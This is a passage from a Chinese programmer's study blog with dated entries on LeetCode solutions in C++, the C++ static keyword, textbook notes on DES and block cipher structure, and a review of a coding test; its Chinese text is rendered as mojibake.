(col2node.count(c)) { auto ret = col2node.equal_range(c); vector\u0026lt;Node\u0026gt; sortedNodes; vector\u0026lt;int\u0026gt; tmp; for (auto a = ret.first; a != ret.second; a++) { sortedNodes.push_back(a-\u0026gt;second); } sort(sortedNodes.begin(), sortedNodes.end(), cmp); for (auto n : sortedNodes) { tmp.push_back(n.val); } res.push_back(tmp); } } return res; } }; 2021-08-01 å»ºå†›èŠ‚ï¼Œä¼Ÿå¤§çš„äººæ°‘å†›é˜Ÿä¸‡å²ï¼\n8 C++ä¸­çš„staticå…³é”®å­— æˆ‘ä»¬çŸ¥é“ï¼Œå‡½æ•°çš„å±€éƒ¨å˜é‡ç©ºé—´åˆ†é…åœ¨æ ˆä¸Šï¼Œå‡½æ•°è¿è¡Œç»“æŸä¹‹åè¿™äº›å˜é‡çš„ç©ºé—´å°±ä¼šè¢«é‡Šæ”¾æ‰ï¼›å½“æˆ‘ä»¬éœ€è¦ä¿å­˜å‡½æ•°ä¸Šä¸€æ¬¡è°ƒç”¨æ—¶å˜é‡çš„çŠ¶æ€ï¼Œå°±éœ€è¦å°†è¿™ä¸ªå˜é‡æ”¾åˆ°å¦ä¸€å—å­˜å‚¨ç©ºé—´ä¸Šï¼Œè¿™å°±æ˜¯ static å…³é”®å­—çš„ä½œç”¨ã€‚\nstatic å˜é‡å­˜å‚¨åœ¨é™æ€å­˜å‚¨åŒºï¼Œåœ¨ç¨‹åºç»“æŸä¹‹å‰éƒ½ä¸ä¼šè¢«é‡Šæ”¾ã€‚å³ä½¿ä¸€ä¸ªå‡½æ•°è¢«å¤šæ¬¡è°ƒç”¨ï¼Œå…¶ä¸­çš„ static å˜é‡ä¹Ÿå§‹ç»ˆåªè¿›è¡Œäº†ä¸€æ¬¡å†…å­˜åˆ†é…ï¼Œä¸”å®ƒçš„å€¼å¯ä»¥ä¿æŒä¸Šä¸€æ¬¡è°ƒç”¨æ—¶çš„æ ·å­ã€‚\nstatic å…³é”®å­—ç”¨äºå®šä¹‰ä¸€ä¸ªç±»ä¸­çš„æˆå‘˜å˜é‡çš„æ—¶å€™ï¼Œæœ‰å…¶ç‹¬ç‰¹çš„å½±å“ã€‚ç”±äº static å˜é‡å­˜å‚¨åœ¨ä¸€å—ç‹¬ç«‹çš„åŒºåŸŸï¼Œæ‰€æœ‰ç±»å¯¹è±¡éƒ½å…±äº«è¿™ä¸€ä¸ªå˜é‡ã€‚å¦‚ä»¥ä¸‹çš„ä¾‹å­æ‰€ç¤ºï¼Œæ‰€æœ‰ GfG ç±»å‹çš„å®ä¾‹éƒ½å…±äº« static å˜é‡ i ã€‚\n// C++ program to demonstrate static // variables inside a class #include\u0026lt;iostream\u0026gt; using namespace std; class GfG { public: static int i; GfG() { // Do nothing }; }; int main() { GfG obj1; GfG obj2; obj1.i =2; obj2.i = 3; // prints value of i cout \u0026lt;\u0026lt; obj1.i\u0026lt;\u0026lt;\u0026#34; \u0026#34;\u0026lt;\u0026lt;obj2.i; // Get 3 } æ­£å› å¦‚æ­¤ï¼Œ ä¸å…è®¸åœ¨ç±»çš„æ„é€ å‡½æ•°ä¸­å¯¹ static ç±»å‹çš„æˆå‘˜å˜é‡è¿›è¡Œæ“ä½œ ã€‚ç±»ä¸­çš„ static å˜é‡åº”è¯¥ç”±ç”¨æˆ·åœ¨å¤–éƒ¨ä½¿ç”¨ä½œç”¨åŸŸè¿ç®—ç¬¦è¿›è¡Œèµ‹å€¼ã€‚\nå¦‚ int GfG::i = 1; ã€‚\nç”±ä»¥ä¸Šçš„åˆ†ææˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥æ¨ç†ï¼Œstatic ç±»å‹çš„ç±»å¯¹è±¡ä¹Ÿå…·æœ‰å…¨å±€çš„ç”Ÿå‘½åŠ›ï¼Œå®ƒçš„ææ„å‡½æ•°åªä¼šåœ¨ç¨‹åºç»“æŸçš„æ—¶å€™è¢«è°ƒç”¨ã€‚\nå†è¿›ä¸€æ­¥æ¨ç†ï¼Œstatic ç±»å‹çš„å‡½æ•°ä¹Ÿå…·æœ‰å…¨å±€çš„ç”Ÿå‘½åŠ›ï¼Œå½“ç„¶ï¼Œå¯¹å‡½æ•°è®¨è®ºâ€œç”Ÿå‘½åŠ›â€æ²¡ä»€ä¹ˆæ„ä¹‰ã€‚\nåœ¨ä¸€ä¸ªç±»ä¸­ï¼Œ static ç±»å‹çš„æˆå‘˜å‡½æ•°æ­£å¦‚ static ç±»å‹çš„æˆå‘˜å˜é‡é‚£æ ·ï¼Œè¢«æ‰€æœ‰å¯¹è±¡ï¼ˆå®ä¾‹ï¼‰æ‰€å…±äº«ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ className.functionName çš„å½¢å¼æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œä¸è¿‡è¿˜æ˜¯é¦–æ¨ä½œç”¨åŸŸè¿ç®—ç¬¦ className::functionName çš„æ–¹å¼æ¥è¿›è¡Œè°ƒç”¨ã€‚ç”±äºæ‰€æœ‰çš„å®ä¾‹éƒ½å…±äº«è¿™ä¹ˆä¸€ä¸ª static å‡½æ•°ï¼Œå®ƒè‡ªç„¶åªèƒ½è®¿é—® static ç±»å‹çš„æˆå‘˜å˜é‡ï¼Œæˆ–è€…å…¶ä»– static ç±»å‹çš„æˆå‘˜å‡½æ•°ï¼›è®¾æƒ³ï¼Œæ‰€æœ‰çš„å®ä¾‹éƒ½æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œç„¶åå®ƒå»è®¿é—®ä¸€ä¸ªéå…¨å±€å…±äº«çš„å˜é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°æ€ä¹ˆçŸ¥é“è¿™ä¸ªå˜é‡åº”è¯¥å±äºå“ªä¸ªå®ä¾‹çš„å‘¢ï¼Ÿ\nReference\n[1] ã€C++ã€‘C++å¸¸è§é¢è¯•é¢˜æ±‡æ€»_æŒç»­æ›´æ–°ä¸­\u0026hellip; - çŸ¥ä¹ (zhihu.com)\n[2] Static Keyword in C++ - GeeksforGeeks\n9 åˆ†ç»„å¯†ç â€”â€”DES 9.1 ç®€ä»‹ åˆ†ç»„å¯†ç ï¼ˆå—å¯†ç ï¼‰æ˜¯å°†æ˜æ–‡æ¶ˆæ¯ç¼–ç è¡¨ç¤ºåçš„äºŒè¿›åˆ¶åºåˆ—ï¼Œåˆ’åˆ†æˆå›ºå®šå¤§å°çš„å—ï¼Œæ¯å—åˆ†åˆ«åœ¨å¯†é’¥çš„æ§åˆ¶ä¸‹å˜æ¢æˆç­‰é•¿çš„äºŒè¿›åˆ¶åºåˆ—ã€‚\næ³¨æ„ï¼Œå°½ç®¡ä¸€äº›ä¼ ç»ŸåŠ å¯†ç®—æ³•ä¹Ÿè¿›è¡Œåˆ†ç»„ï¼Œä½†å®ƒä»¬å¹¶ä¸æ˜¯åˆ†ç»„å¯†ç ã€‚ä¾‹å¦‚ï¼ŒVigenereåŠ å¯†ç®—æ³•çš„å¯†é’¥ä¹Ÿå¯ä»¥è‡ªå®šä¹‰å—çš„å¤§å°ï¼Œä½†å®ƒä¸å±äºåˆ†ç»„å¯†ç ã€‚\nåˆ†ç»„å¯†ç åŠ è§£å¯†çš„è®¾è®¡æœ‰å¦‚ä¸‹å‡ ä¸ªè¦æ±‚ï¼š\nåˆ†ç»„è¶³å¤Ÿé•¿ã€‚ æ ¹æ®åˆ†ç»„é•¿åº¦ n ï¼Œæ¯ä¸€ç»„ä¸­çš„å…ƒç´ ä¸ªæ•° 2^n è¦è¶³å¤Ÿå¯¹æŠ—æ˜æ–‡ç©·ä¸¾æ”»å‡»ã€‚ å¯†é’¥é•¿åº¦è¶³å¤Ÿé•¿ã€‚ å¯†é’¥é•¿åº¦ k ï¼Œåˆ™å¯†é’¥æœ‰ 2^k ç§æƒ…å†µï¼Œéœ€è¦è¶³å¤Ÿå¯¹æŠ—å¯†é’¥ç©·ä¸¾æ”»å‡»ã€‚ä½†å¯†é’¥é•¿åº¦ä¸èƒ½å¤ªé•¿ï¼Œå¦åˆ™ä¸åˆ©äºç®¡ç†å’ŒåŠ è§£å¯†é€Ÿåº¦ã€‚ ç½®æ¢ç®—æ³•è¶³å¤Ÿå¤æ‚ã€‚ ç½®æ¢ç®—æ³•è¦è¶³ä»¥å¯¹æŠ—å·®åˆ†æ”»å‡»å’Œçº¿æ€§æ”»å‡»ç­‰ï¼Œä½¿å¾—æ”»å‡»è€…åªèƒ½è¿›è¡Œç©·ä¸¾ã€‚ åŠ è§£å¯†è¿ç®—ç®€å•ï¼Œåˆ©äºç¡¬ä»¶å®ç°ã€‚ ä¸€èˆ¬æ— æ•°æ®æ‰©å±•ï¼Œå³æ˜æ–‡å’Œå¯†æ–‡é•¿åº¦ç›¸åŒã€‚ Shannonæå‡ºäº†ä¸‰ä¸ªåˆ†ç»„å¯†ç çš„è®¾è®¡æ€æƒ³â€”â€”æ··ä¹±ã€æ‰©æ•£å’Œä¹˜ç§¯å¯†ç ã€‚\næ··ä¹±ã€‚ å¯ä»¥ç†è§£ä¸ºâ€æ…æ‹Œæœºâ€œï¼ŒæŒ‡åœ¨åŠ å¯†è¿‡ç¨‹ä¸­æ˜æ–‡ã€å¯†é’¥ä»¥åŠå¯†æ–‡ä¹‹é—´çš„å…³ç³»å°½å¯èƒ½å¤æ‚ï¼Œä»¥é˜²å¯†ç ç ´è¯‘è€…é‡‡ç”¨ç»Ÿè®¡åˆ†ææ³•è¿›è¡Œç ´è¯‘æ”»å‡»ã€‚ æ‰©æ•£ã€‚ æ¯1æ¯”ç‰¹æ˜æ–‡çš„å˜åŒ–å°½å¯èƒ½å¤šåœ°å½±å“åˆ°è¾“å‡ºå¯†æ–‡åºåˆ—çš„æ¯”ç‰¹ï¼Œä»¥ä¾¿éšè—æ˜æ–‡çš„ç»Ÿè®¡ç‰¹æ€§ã€‚æ‰©æ•£çš„å¦ä¸€å±‚æ„æ€æ˜¯æ¯1ä½å¯†é’¥ä¹Ÿå°½å¯èƒ½å½±å“åˆ°è¾ƒå¤šçš„è¾“å‡ºå¯†æ–‡æ¯”ç‰¹ã€‚ç®€è€Œè¨€ä¹‹ï¼Œæ‰©æ•£å°±æ˜¯å¸Œæœ›å¯†æ–‡ä¸­çš„ä»»ä¸€æ¯”ç‰¹éƒ½è¦å°½å¯èƒ½ä¸æ˜æ–‡å’Œå¯†é’¥çš„æ¯ä¸€æ¯”ç‰¹ç›¸å…³è”ã€‚ ä¹˜ç§¯å¯†ç ä½“åˆ¶ã€‚ é’ˆå¯¹åµŒå¥—åŠ å¯†çš„ä¸€ç³»åˆ—åŸåˆ™ã€‚æ­¤å¤„çœç•¥ã€‚ 9.2 åˆ†ç»„å¯†ç çš„è¿­ä»£ç»“æ„ åˆ†ç»„å¯†ç æœ‰ä¸¤ç§è¿­ä»£ç»“æ„ï¼šFeistelç½‘ç»œç»“æ„å’ŒSPç½‘ç»œç»“æ„ã€‚\nFeistelç½‘ç»œç»“æ„çš„åŠ å¯†åŠæ³•å¦‚ä¸‹ï¼š\nå°†æ˜æ–‡åˆ†ç»„åˆ†å‰²æˆé•¿åº¦ç›¸åŒçš„ä¸¤å—ï¼š(L0, R0)\nå¯¹æ¯ä¸€è½®ï¼Œi=0,1,\u0026hellip;n\nLi+1 = Ri\nRi+1 = Li âŠ• F(Ri, Ki)\nåŠ å¯†åçš„å¯†æ–‡ä¸º (Rn+1, Ln+1)\nè§£å¯†åŠæ³•ä¸åŠ å¯†åŠæ³•ç›¸åï¼š\nå¯¹äºå¯†æ–‡(Rn+1, Ln+1)ï¼Œæ¯ä¸€è½® i=n,n-1,\u0026hellip;0\nRi = Li+1\nLi = Ri+1 âŠ• F(Li+1, Ki)\nè§£å¯†å‡º (L0, R0)\nSPç½‘ç»œç»“æ„æ˜¯ä»£æ¢-ç½®æ¢ç½‘ç»œçš„ç®€å†™ã€‚å®ƒç”±ä¸¤ä¸ªåŸºæœ¬ç»„ä»¶Sç›’å’ŒPç›’ç»„æˆã€‚Sç›’è¿›è¡Œä»£æ¢æ“ä½œï¼Œèµ·åˆ°æ··ä¹±ä½œç”¨ï¼›Pç›’è¿›è¡Œç½®æ¢æ“ä½œï¼Œèµ·åˆ°æ‰©æ•£ä½œç”¨ã€‚æ¯ä¸€è½®è¿­ä»£ä¸­éƒ½å…ˆç»è¿‡Sç›’ã€å†ç»è¿‡Pç›’ã€‚\néœ€è¦æ³¨æ„ï¼Œç½®æ¢ä¸ç­‰äºæ‰©æ•£ã€‚ç½®æ¢æœ¬èº«å¹¶ä¸æ”¹å˜æ˜æ–‡åœ¨å•ä¸ªå­—ç¬¦æˆ–ç½®æ¢åˆ†ç»„ä¸Šçš„ç»Ÿè®¡ç‰¹æ€§ã€‚ä½†æ˜¯ï¼Œç»è¿‡äº†å¤šè½®ä»£æ¢-ç½®æ¢çš„ç»“åˆï¼Œå°±äº§ç”Ÿäº†æ‰©æ•£ä½œç”¨ã€‚\n9.3 DES DESçš„åˆå§‹å¯†é’¥é•¿åº¦ä¸º64ä½ï¼Œä½†æœ‰æ•ˆå¯†é’¥ä¸º56ä½ï¼Œå…¶ä¸­ç¬¬8/16/24/32/40/48/56ä½æ˜¯å¥‡å¶æ ¡éªŒä½ã€‚\næµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nDES DESçš„åˆå§‹ç½®æ¢Initial Permutationæ˜¯å›ºå®šçš„ï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†åŸæ˜æ–‡å—çš„ä½è¿›è¡Œæ¢ä½ã€‚å®ŒæˆåŠ å¯†ä¹‹åï¼Œè¦ä½¿ç”¨å®ƒçš„é€†ç½®æ¢å°†å…¶æ¢å›æ¥ï¼Œç½®æ¢è¡¨å¦‚å›¾æ‰€ç¤ºï¼š\nDES IP DESä¸€è½®è¿­ä»£è¿‡ç¨‹å¦‚å›¾æ‰€ç¤ºï¼Œå…¶éµå¾ªäº†Feistelç½‘ç»œç»“æ„ï¼Œè½®å‡½æ•°æ€»å…±ç»å†äº†æ‰©å±•ç½®æ¢-å¯†é’¥åŠ -éçº¿æ€§ä»£æ¢-çº¿æ€§ç½®æ¢å››ä¸ªæ­¥éª¤ã€‚\nDES Round æ‰©å±•ç½®æ¢åˆç§°Eç›’ï¼Œå°†32ä½è¾“å…¥æ‰©å±•ä¸º48ä½è¾“å‡ºã€‚Eç›’åœ¨DESç®—æ³•ä¸Šæœ€åŸºæœ¬åœ°æ˜¯è¦å°†è¾“å…¥æ‰©å±•ä¸ºä¸è½®å¯†é’¥ç›¸åŒçš„48æ¯”ç‰¹ï¼Œè€Œæ›´è¿›ä¸€æ­¥ï¼Œç”±äºEç›’çš„1ä½è¾“å…¥å¯èƒ½å½±å“2ä¸ªSç›’çš„è¾“å…¥ï¼Œèƒ½å¤Ÿæ›´å¿«åœ°å®ç°è¡€å´©æ•ˆåº”ã€‚\nä»£æ¢ç›’åˆç§°Sç›’ï¼Œæ˜¯DESä¸­å”¯ä¸€çš„éçº¿æ€§éƒ¨åˆ†ã€‚ç»è¿‡Sç›’çš„ä»£æ¢ï¼ŒEç›’æ‰©å±•ç”Ÿæˆçš„48ä½æ•°åˆå‹ç¼©å›32ä½ã€‚\næœ€åçš„Pç›’æ²¡æœ‰å¤ªå¤šæ¢è®¨çš„æ„ä¹‰ï¼Œå°±æ˜¯ä¸€ä¸ª32ä½çš„ç½®æ¢è¡¨ã€‚\nDESçš„å¯†é’¥ç¼–æ’å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œé¦–å…ˆå°†64ä½å¯†é’¥è¿›è¡ŒPC-1ç½®æ¢ï¼Œç„¶åæ ¹æ®è½®æ•°è¿›è¡Œå·¦ç§»ï¼Œå…¶ä¸­ï¼Œç¬¬1/2/9/16åªç§»åŠ¨1ä½ï¼Œå…¶ä½™è½®æ•°ç§»åŠ¨2ä½ã€‚æœ€åï¼Œ56ä½å¯†é’¥ç»è¿‡PC-2ç½®æ¢å¾—åˆ°48ä½å¯†é’¥ã€‚\nDES Key Generation å…³äºDESçš„å®‰å…¨æ€§é—®é¢˜ï¼Œæš‚ä¸”ä¸äºˆè®°å½•äº†~\n10 ç¬”è¯•å¤ç›˜ æ™šä¸Šå‚åŠ äº†Shopeeçš„ç¬”è¯•ï¼Œæœç„¶å®‰å…¨æ‹‰èƒ¯ï¼Œç¼–ç¨‹AKâ€¦â€¦\nç¼–ç¨‹é¢˜å®é™…ä¸Šä¹Ÿä¸éš¾ï¼Œç¬¬ä¸€é¢˜ä¼°è®¡æœ‰ä¸ªLeetCodeçš„ä¸­ç­‰åä¸Šï¼Œäºˆä»¥è®°å½•å§ã€‚\næœ‰ä¸€ä¸ªæ•´æ•° n å’Œä¸€ä¸ªæ•´æ•° k ï¼Œç°åœ¨è¦å°† n åˆ†æˆ k ä»½ï¼Œæ¯ä»½è‡³å°‘æœ‰ä¸€ä¸ªå…ƒç´ ï¼Œæ±‚æ€»å…±æœ‰å¤šå°‘ç§åˆ†æ³•ã€‚æ³¨æ„ï¼Œåˆ†å‰²çš„åŠæ³•ä¸è€ƒè™‘é¡ºåºï¼Œä¾‹å¦‚å°† 7 åˆ†æˆ 3 ä»½ï¼Œå…¶ä¸­ 1,1,5 å’Œ 5,1,1 æˆ– 1,5,1 å±äºåŒä¸€ç§åˆ†æ³•ã€‚\n1 \u0026lt;= n \u0026lt;= 200 1 \u0026lt;= k \u0026lt;= 7 è¿™é¢˜æˆ‘ä½¿ç”¨äº†ä¸‰ç»´è®°å¿†åŒ–æœç´¢ï¼Œrec[n][k][startswith] è¡¨ç¤ºå°† n åˆ†æˆ k ä»½ï¼Œæ¯ä¸€ä»½çš„å…ƒç´ è‡³å°‘è¦å¤§äº startswith ã€‚\nå‡è®¾è¦å°† 7 åˆ†æˆ 3 ä»½ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶è½¬åŒ–ä¸ºå°† 6 åˆ†ä¸º 2 ä»½ï¼Œæ¯ä»½è‡³å°‘ä» 1 å¼€å§‹ï¼Œæˆ–è€…å°† 5 åˆ†ä¸ºä¸¤ä»½ï¼Œæ¯ä»½è‡³å°‘ä» 2 å¼€å§‹â€¦â€¦\nä¸å¥½è§£é‡Šï¼Œç›´æ¥æ”¾ä»£ç ï¼š\n#include \u0026lt;vector\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; int record[210][8][210]; int d(int n, int k, int startswith) { // cout \u0026lt;\u0026lt; n \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; k \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; startswith \u0026lt;\u0026lt; endl; if (record[n][k][startswith]) return record[n][k][startswith]; if (startswith * k \u0026gt; n) return 0; if (k == 1) return 1; int res = 0; for (int start = startswith; start \u0026lt;= n / 2; start++) { res += d(n - start, k - 1, start); } record[n][k][startswith] = res; return res; } int divide(int n, int k) { // write code here return d(n, k, 1); } int main() { int n, k; n = 200; k = 7; cout \u0026lt;\u0026lt; divide(n, k) \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); } æœ¬åœºç¬”è¯•ä¹Ÿæš´éœ²å‡ºäº†ä¸€äº›å®‰å…¨ç†è®ºä¸Šçš„ç¼ºé™·ï¼Œä¹‹åæœ‰ç©ºè¿›è¡Œæ€»ç»“ã€‚ä»Šå¤©å°±å…ˆåˆ°è¿™é‡Œå•¦~\nReference\n[1] è°·åˆ©æ³½,éƒ‘ä¸–æ…§,æ¨ä¹‰å…ˆ.ç°ä»£å¯†ç å­¦æ•™ç¨‹ï¼ˆç¬¬2ç‰ˆï¼‰[M].åŒ—äº¬:åŒ—äº¬é‚®ç”µå¤§å­¦å‡ºç‰ˆç¤¾,2019\n2021-08-03 ä»Šå¤©å°†æ˜¨å¤©çš„ç¬”è¯•é¢˜æ•´ç†äº†ä¸€ä¸‹ï¼Œè¿˜æœ‰äº›é¢˜ç›®æ‰¾ä¸åˆ°ç­”æ¡ˆï¼Œæ˜å¤©ç»§ç»­~\n2021-08-14 æ–­æ›´å°†è¿‘2å‘¨ï¼Œé™†ç»­æ¢å¤å§â€¦â€¦\n11 LeetCode 1583. ç»Ÿè®¡ä¸å¼€å¿ƒçš„æœ‹å‹ 1583. ç»Ÿè®¡ä¸å¼€å¿ƒçš„æœ‹å‹ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰ (leetcode-cn.com)\nä»Šå¤©çš„é¢˜ç›®æ˜¯ä¸ªæ¨¡æ‹Ÿé¢˜ï¼Œç„¶è€Œæˆ‘å¡äº†åŠå¤©æ²¡æœ‰åšå‡ºæ¥â€¦â€¦\nè¿™é‡Œçš„ä¸€ä¸ªå…³é”®æ˜¯å»ºç«‹äºŒç»´æ˜ å°„ rank[x][y] è¡¨ç¤º y åœ¨ x å¿ƒä¸­çš„ä¼˜å…ˆçº§ï¼Œæ•°å€¼çš„è¯ç›´æ¥æŒ‰ç…§ preferences[x] ä¸­ y æ‰€å¤„çš„ä¸‹æ ‡å³å¯ã€‚\nå¯¹äºä¸€ä¸ª x æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æ‰€æœ‰ä½äº rank[x][y] ä¹‹å‰çš„æ•° u ï¼Œå³ x å¿ƒä¸­æ¯” y æ›´åŠ ä¼˜å…ˆåŒ¹é…çš„å¯¹è±¡ï¼Œå†æ‰¾åˆ° u çš„ç°æœ‰å¯¹è±¡ v ï¼Œæ¯”è¾ƒ rank[u][x] å’Œ rank[u][v] çš„å¤§å°ã€‚å¦‚æœ rank[u][x] \u0026lt; rank[u][v] ï¼Œè¯´æ˜ u ä¹Ÿæ›´å¸Œæœ›å’Œ x è¿›è¡ŒåŒ¹é…ï¼Œé‚£ä¹ˆä¾ç…§é¢˜æ„ï¼Œ x å°±æ˜¯ä¸å¼€å¿ƒçš„ã€‚\nä¹‹å‰å¯¹äºä¸å¼€å¿ƒçš„ç†è§£ï¼Œæ˜¯ x ä¸å¼€å¿ƒï¼Œåˆ™ u åº”è¯¥ä¹Ÿä¸å¼€å¿ƒï¼Œè¿™æ ·å°±æ¯”è¾ƒå¤æ‚äº†ã€‚æˆ‘ä»¬åªè€ƒè™‘ x å¼€ä¸å¼€å¿ƒï¼ŒæŠŠ u æ”¾åˆ°ä¹‹åè¿›è¡Œè€ƒè™‘ï¼Œåè€Œç®€å•ä¸€äº›ã€‚\nä»£ç å°±ä¸æ”¾äº†ï¼ŒWAäº†ä¸¤æ¬¡çš„ä¸­ç­‰é¢˜ï¼Œæˆ‘ç°åœ¨å±å®ä¸æ€ä¹ˆå¼€å¿ƒã€‚\n12 LeetCodeé¢è¯•é¢˜ 04.05. åˆæ³•äºŒå‰æœç´¢æ ‘ https://leetcode-cn.com/problems/legal-binary-search-tree-lcci/\nè¿™é¢˜å±å®é¡¶ä¸ä½äº†â€¦â€¦å‡ºé¢˜äººç»™é‚£ä¹ˆå¤š INT_MAX çš„æµ‹è¯•ç”¨ä¾‹å¹²å•¥ï¼Ÿï¼Ÿï¼Ÿ\nå¸Œæœ›æ£€æŸ¥ä¸€é¢—æ ‘æ˜¯å¦æ˜¯äºŒå‰æœç´¢æ ‘ï¼Œåªéœ€è¦è€ƒè™‘å®ƒçš„å·¦èŠ‚ç‚¹æ˜¯å¦æ»¡è¶³ä¸€å®šèŒƒå›´ã€å³èŠ‚ç‚¹æ˜¯å¦æ»¡è¶³ä¸€å®šèŒƒå›´ï¼Œç„¶åæŒ‰ç…§é€’å½’çš„æ€è·¯å‘ä¸‹è¿›è¡Œï¼Œç±»ä¼¼äºæ·±æœã€‚\nåˆå§‹æƒ…å†µä¸‹ï¼ˆå³è€ƒè™‘æ ¹èŠ‚ç‚¹çš„æ—¶å€™ï¼‰ï¼Œå®ƒçš„æ•°æ®èŒƒå›´åº”è¯¥æ˜¯ -INF ~ +INF ï¼Œç„¶è€Œï¼Œå‡ºé¢˜äººç»™äº†å¾ˆå¤šç»„ INT_MAX å’Œ INT_MIN çš„æµ‹è¯•ç”¨ä¾‹ï¼Œç®€å•åœ°ä½¿ç”¨è¿™ä¸¤ä¸ªå®ä½œä¸ºåˆå§‹æ•°æ®èŒƒå›´ï¼Œä¼šæŒ‚æ‰ã€‚ï¼ˆä¸¢é›·æ¥¼æŸï¼‰\nå› æ­¤ï¼Œæˆ‘ä»¬çš„é€’å½’å‡½æ•°ä¸­è¡¨ç¤ºæ•°æ®èŒƒå›´çš„å‚æ•°éœ€è¦å®šä¹‰ä¸º long long ç±»å‹ï¼Œç„¶ååœ¨åˆå§‹ä¼ å…¥çš„æ—¶å€™ï¼Œä¼ ä¸ªæ¯” INT_MAX è¿˜å¤§çš„æ•° (long)INT_MAX + 1 ã€‚\næˆ‘giaoï¼\nPerformance 13 LeetCode5845. ä½ èƒ½ç©¿è¿‡çŸ©é˜µçš„æœ€åä¸€å¤© é¢˜ç›®é“¾æ¥ 5845. ä½ èƒ½ç©¿è¿‡çŸ©é˜µçš„æœ€åä¸€å¤©\nã€Šå…³äºæ€è·¯æ­£ç¡®è€Œä»£ç è´¨é‡å¤ªå·®å¯¼è‡´æˆ‘TLEä»è€Œåªåšå‡ºäº†å‘¨èµ›ç­¾åˆ°é¢˜è¿™ä»¶äº‹ã€‹\nå€’ä¸å®Œå…¨è®¤ä¸ºå®ƒæ˜¯é“å›°éš¾é¢˜ï¼Œæ¯•ç«Ÿç¬¬ä¸€æ—¶é—´æ˜¯æœ‰æ€è·¯çš„ã€‚\né¦–å…ˆï¼ŒäºŒåˆ†ç­”æ¡ˆæ˜¯ç¬¬ä¸€æƒ³æ³•ï¼ŒTLEçš„é£é™©ä¹ŸåŒæ—¶å­˜åœ¨ã€‚\nå¯¹äºä¸€ä¸ªç­”æ¡ˆ day æ¥è¯´ï¼Œå¦‚ä½•åˆ¤æ–­åœ¨è¿™ä¸€å¤©é‡Œèƒ½å¦ä»ç¬¬ä¸€è¡Œåˆ°è¾¾æœ€åä¸€è¡Œå‘¢ï¼ŸBFSå•Šï¼\næˆ‘ä»¬åœ¨ day è¿™ä¸€å¤©çš„è¿›è¡ŒBFSå¯»è·¯ï¼Œä»ç¬¬ä¸€è¡Œçš„ä»»æ„ä¸€ä¸ªèµ·ç‚¹å‡ºå‘ï¼Œå¦‚æœæŸä¸ªèµ·ç‚¹èƒ½åˆ°è¾¾æœ€åä¸€è¡Œçš„æŸä¸ªç»ˆç‚¹ï¼Œè¯´æ˜åœ¨ day è¿™ä¸€å¤©è¿˜èƒ½å¤Ÿç©¿è¿‡çŸ©é˜µï¼Œç»§ç»­è¿›è¡ŒäºŒåˆ†ã€‚\nå¯»è·¯æ—¶ï¼Œåœ¨ day è¿™ä¸€å¤©è¢«æ°´æ·¹æ²¡çš„æ ¼å­å°±èµ°ä¸äº†äº†ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå…³é”®é—®é¢˜ï¼šå¦‚ä½•éªŒè¯æŸä¸ªæ ¼å­æ˜¯å¦è¢«æ°´æ·¹æ²¡ï¼Ÿæœ€å¼€å§‹ï¼Œæˆ‘ä½¿ç”¨äº†ä¸€ä¸ª map æ¥è¡¨ç¤ºæŸä¸ªæ ¼å­æ˜¯å¦è¢«æ·¹ï¼Œä½†è¿™æ ·æˆ‘ä»¬éœ€è¦é¢å¤–å¼•å…¥ O(logn) çš„å¤æ‚åº¦ï¼Œä¼šè¶…æ—¶ã€‚æ¯”èµ›ç»“æŸä¹‹åæŸ¥çœ‹é¢˜è§£ï¼Œå‘ç°ç›´æ¥ç”¨ visited æ•°ç»„æ¥æŠŠè¢«æ·¹è¿‡çš„æ ¼å­ç¦ç”¨æ‰å³å¯â€¦â€¦\næ€»ä¹‹ï¼Œæ¯”èµ›çš„æ—¶å€™æäº¤çš„ä»£ç è´¨é‡ç¡®å®å·®äº†ï¼Œè¿˜å¾—å¤šç»ƒç»ƒå§ã€‚\nACä»£ç  class Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; g_cells; int g_row, g_col; typedef struct _pos { int x, y; friend bool operator\u0026lt; (const _pos\u0026amp; a, const _pos\u0026amp; b) { if (a.x != b.x) return a.x \u0026lt; b.x; else return a.y \u0026lt; b.y; }; } Pos, * PPos; map\u0026lt;Pos, int\u0026gt; watered; bool hasRoute(int day) { // cout \u0026lt;\u0026lt; \u0026#34;day \u0026#34; \u0026lt;\u0026lt; day \u0026lt;\u0026lt; endl; vector\u0026lt;pair\u0026lt;int, int\u0026gt;\u0026gt; dirs = { {1, 0}, {0, 1}, {-1, 0}, {0, -1} }; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; visited(g_row, vector\u0026lt;int\u0026gt;(g_col, 0)); queue\u0026lt;Pos\u0026gt; q; Pos head; // é€šè¿‡è®¾ç½®visitedæ•°ç»„æ¥ä½¿å¾—è¢«æ·¹æ²¡çš„æ–¹å—æ— æ³•è®¿é—® for (int i = 0; i \u0026lt; day; i++) { visited[g_cells[i][0] - 1][g_cells[i][1] - 1] = 1; // cout \u0026lt;\u0026lt; g_cells[i][0] - 1 \u0026lt;\u0026lt; \u0026#34;,\u0026#34; \u0026lt;\u0026lt; g_cells[i][1] - 1 \u0026lt;\u0026lt; \u0026#34; watered\\n\u0026#34;; } for (int start = 0; start \u0026lt; g_col; start++) { head.x = 0; head.y = start; // è¯¥èµ·ç‚¹è¢«æ·¹äº† if (visited[head.x][head.y]) continue; q.push(head); visited[head.x][head.y] = 1; } while (!q.empty()) { head = q.front(); q.pop(); // cout \u0026lt;\u0026lt; head.x \u0026lt;\u0026lt; \u0026#34;,\u0026#34; \u0026lt;\u0026lt; head.y \u0026lt;\u0026lt; endl; if 